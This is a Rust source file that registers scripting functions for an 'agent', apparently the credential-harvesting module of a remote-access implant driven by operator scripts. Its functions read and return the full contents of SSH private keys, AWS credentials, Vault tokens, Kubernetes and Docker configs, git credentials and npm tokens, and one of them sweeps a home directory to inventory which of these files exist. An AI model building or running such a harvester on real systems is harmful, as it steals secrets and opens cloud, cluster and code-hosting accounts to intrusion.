// src/agent/scripting/credential.rs
//
// Convenience readers for well-known credential file locations.
// Each function wraps what could be done with internal_read + internal_find_files
// but handles path resolution, profile discovery, and format normalization
// so operator scripts don't have to re-implement the logic.

use rhai::Engine;
use std::{fs, path::PathBuf};
use serde_json::json;

pub fn register(engine: &mut Engine) {

    // ── SSH private keys ──────────────────────────────────────────────────────
    // Scans ~/.ssh/ (or a provided directory) for private key files.
    // Returns JSON: [{path, content, key_type}]
    engine.register_fn("internal_ssh_keys", |home_dir: &str| -> String {
        let base = if home_dir.is_empty() {
            home_path(".ssh")
        } else {
            PathBuf::from(home_dir)
        };
        let Ok(rd) = fs::read_dir(&base) else {
            return format!("Error: cannot read {}", base.display());
        };
        let keys: Vec<serde_json::Value> = rd.flatten()
            .filter(|e| e.file_type().map(|t| t.is_file()).unwrap_or(false))
            .filter_map(|e| {
                let content = fs::read_to_string(e.path()).ok()?;
                if !content.contains("PRIVATE KEY") { return None; }
                let key_type = if content.contains("RSA PRIVATE")    { "rsa" }
                    else if content.contains("OPENSSH PRIVATE")      { "openssh" }
                    else if content.contains("EC PRIVATE")           { "ecdsa" }
                    else if content.contains("DSA PRIVATE")          { "dsa" }
                    else                                             { "unknown" };
                Some(json!({
                    "path":     e.path().display().to_string(),
                    "key_type": key_type,
                    "content":  content,
                }))
            })
            .collect();
        serde_json::to_string(&keys).unwrap_or("[]".into())
    });

    // ── AWS credentials ───────────────────────────────────────────────────────
    // Reads ~/.aws/credentials and ~/.aws/config.
    // Returns JSON: {credentials, config}
    engine.register_fn("internal_aws_credentials", || -> String {
        let creds  = read_home(".aws/credentials");
        let config = read_home(".aws/config");
        json!({ "credentials": creds, "config": config }).to_string()
    });

    // ── HashiCorp Vault token ─────────────────────────────────────────────────
    engine.register_fn("internal_vault_token", || -> String {
        read_home(".vault-token")
    });

    // ── Kubernetes config ─────────────────────────────────────────────────────
    // Contains cluster endpoints, CA bundles, and user credentials.
    engine.register_fn("internal_kube_config", || -> String {
        // Honour KUBECONFIG env var first.
        if let Ok(path) = std::env::var("KUBECONFIG") {
            if let Ok(content) = fs::read_to_string(&path) {
                return content;
            }
        }
        read_home(".kube/config")
    });

    // ── Docker credentials ────────────────────────────────────────────────────
    // Contains base64-encoded registry auth tokens.
    engine.register_fn("internal_docker_config", || -> String {
        read_home(".docker/config.json")
    });

    // ── Git credentials ───────────────────────────────────────────────────────
    // ~/.git-credentials stores plaintext https://user:token@host entries.
    engine.register_fn("internal_git_credentials", || -> String {
        read_home(".git-credentials")
    });

    // ── npm / node auth tokens ────────────────────────────────────────────────
    // ~/.npmrc may contain //registry.npmjs.org/:_authToken=...
    engine.register_fn("internal_npm_token", || -> String {
        read_home(".npmrc")
    });

    // ── Generic credential sweep ──────────────────────────────────────────────
    // Checks all of the above paths and returns a JSON summary of what exists.
    engine.register_fn("internal_credential_sweep", || -> String {
        let checks: Vec<(&str, &str)> = vec![
            ("ssh_keys",     ".ssh"),
            ("aws_creds",    ".aws/credentials"),
            ("vault_token",  ".vault-token"),
            ("kube_config",  ".kube/config"),
            ("docker_cfg",   ".docker/config.json"),
            ("git_creds",    ".git-credentials"),
            ("npmrc",        ".npmrc"),
        ];
        let results: Vec<serde_json::Value> = checks.iter()
            .map(|(name, rel)| {
                let path = home_path(rel);
                json!({
                    "name":   name,
                    "path":   path.display().to_string(),
                    "exists": path.exists(),
                    "size":   fs::metadata(&path).map(|m| m.len()).unwrap_or(0),
                })
            })
            .collect();
        serde_json::to_string(&results).unwrap_or("[]".into())
    });
}

// ─────────────────────────────────────────────────────────────────────────────
// Helpers
// ─────────────────────────────────────────────────────────────────────────────

fn home_path(rel: &str) -> PathBuf {
    #[cfg(target_os = "windows")]
    let home = std::env::var("USERPROFILE").unwrap_or_default();
    #[cfg(not(target_os = "windows"))]
    let home = std::env::var("HOME").unwrap_or_default();

    PathBuf::from(home).join(rel)
}

fn read_home(rel: &str) -> String {
    fs::read_to_string(home_path(rel))
        .unwrap_or_else(|e| format!("Error: {}", e))
}
